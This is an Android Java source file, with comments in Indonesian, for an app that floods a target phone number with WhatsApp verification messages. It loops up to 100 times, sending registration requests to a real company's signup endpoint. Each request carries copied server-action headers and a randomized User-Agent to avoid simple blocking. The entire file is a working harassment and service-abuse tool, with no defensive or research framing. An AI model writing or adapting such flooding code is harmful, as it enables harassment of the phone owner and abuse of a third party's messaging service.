package com.xyra.config;

import android.app.Activity;
import android.os.AsyncTask; 
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

// --- HARUS ADA UNTUK MENGHILANGKAN ERROR OKHTTP ---
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
// --------------------------------------------------

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.Random;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private Button btnStartFlood;
    private ProgressBar progressBar;
    private TextView tvStatus;

    // --- PERBAIKAN AKHIR: PROGRESS HANYA Object TUNGGAL ---
    // Parameter Kedua (Progress) diubah menjadi Object
    private class AccFloodTask extends AsyncTask<String, Object, String> { 

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3; 

        @Override
        protected void onPreExecute() {
            // Logika UI PreExecute dipindahkan ke OnClickListener
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            // Setup OkHttpClient
            OkHttpClient client = new OkHttpClient.Builder()
                .connectTimeout(15, TimeUnit.SECONDS)
                .readTimeout(20, TimeUnit.SECONDS) // Max 20s per request
                .build();

            String url = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();
                String statusMsg;

                try {
                    // Buat Payload JSON
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", "whatsapp");
                    jsonArray.put(payload);

                    RequestBody body = RequestBody.create(
                        MediaType.parse("text/plain"), 
                        jsonArray.toString()
                    );

                    // Buat Request
                    Random rand = new Random();
                    String userAgent = "Mozilla/5.0 (Android) Chrome/" + (rand.nextInt(25) + 100) + ".0.0.0 Safari/537.36";

                    Request request = new Request.Builder()
                        .url(url)
                        .post(body)
                        .addHeader("User-Agent", userAgent)
                        .addHeader("Accept", "text/x-component")
                        .addHeader("Content-Type", "text/plain")
                        .addHeader("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7")
                        .addHeader("Origin", "https://www.acc.co.id")
                        .addHeader("Referer", "https://www.acc.co.id/register/new-account")
                        .addHeader("sec-ch-ua-platform", "\"Android\"")
                        .build();

                    // Eksekusi
                    try (Response response = client.newCall(request).execute()) {
                        long duration = System.currentTimeMillis() - startTime;
                        totalDurationMs += duration;

                        if (response.code() == 200) {
                            totalSuccesses++;
                            statusMsg = "SUCCESS (200 OK) - " + duration + "ms";
                        } else {
                            totalFailures++;
                            statusMsg = "GAGAL (HTTP " + response.code() + ") - " + duration + "ms";
                        }
                    }

                } catch (IOException e) {
                    // Penanganan IOException untuk Timeout atau Koneksi
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    statusMsg = "GAGAL (Koneksi/Timeout) - " + duration + "ms";
                } catch (Exception e) {
                    totalFailures++;
                    statusMsg = "GAGAL (Error Internal: " + e.getMessage() + ")";
                }

                // Update UI Progress
                int progress = (int) ((float) i / totalKirim * 100);

                // Kirim array Object ke publishProgress
                publishProgress(progress, i, totalSuccesses, totalFailures, statusMsg);

                // JEDA WAKTU
                if (i < totalKirim) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return "Selesai";
        }

        // --- UBAH SIGNATURE METHOD UNTUK MENGHILANGKAN ERROR ASYNCTASK ---
        // Karena Progress adalah Object, onProgressUpdate menerima Object... values
        @Override
        protected void onProgressUpdate(Object... values) { 
            // Lakukan casting untuk mengambil nilai yang dikirim
            progressBar.setProgress((Integer) values[0]);

            int current = (Integer) values[1];
            int suc = (Integer) values[2];
            int fail = (Integer) values[3];
            String msg = (String) values[4];

            tvStatus.setText("Status: " + msg + "\n" +
                             "Iterasi: " + current + "/" + totalKirim + 
                             " | Sukses: " + suc + " | Gagal: " + fail);
        }

        @Override
        protected void onPostExecute(String result) {
            progressBar.setVisibility(View.GONE);
            btnStartFlood.setEnabled(true);

            float avgTime = (totalKirim > 0) ? (float) totalDurationMs / totalKirim : 0;

            // Tampilkan Ringkasan Akhir
            String summary = String.format(
                "✅ Selesai!\nTotal: %d\nSukses: %d\nGagal: %d\nRata-rata Waktu: %.2f ms",
                totalKirim, totalSuccesses, totalFailures, avgTime
            );
            tvStatus.setText("Status: " + summary);
            Toast.makeText(MainActivity.this, "Proses Selesai!", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main); 

        etTargetPhone = findViewById(R.id.et_target_phone);
        etJumlahKirim = findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = findViewById(R.id.btn_start_flood);
        progressBar = findViewById(R.id.progress_bar);
        tvStatus = findViewById(R.id.tv_status);

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    String targetPhone = etTargetPhone.getText().toString().trim();
                    String jumlahStr = etJumlahKirim.getText().toString().trim();

                    if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                        Toast.makeText(MainActivity.this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    try {
                        int jumlahKirim = Integer.parseInt(jumlahStr);
                        if (jumlahKirim < 1 || jumlahKirim > 100) {
                            Toast.makeText(MainActivity.this, "Jumlah harus antara 1-100!", Toast.LENGTH_SHORT).show();
                            return;
                        }

                        // Tampilkan UI sebelum memulai task
                        btnStartFlood.setEnabled(false);
                        progressBar.setVisibility(View.VISIBLE);
                        tvStatus.setText("Status: Memulai proses...");

                        // Mulai proses pengiriman di background
                        new AccFloodTask().execute(targetPhone, String.valueOf(jumlahKirim));

                    } catch (NumberFormatException e) {
                        Toast.makeText(MainActivity.this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
                    }
                }
            });
    }
}

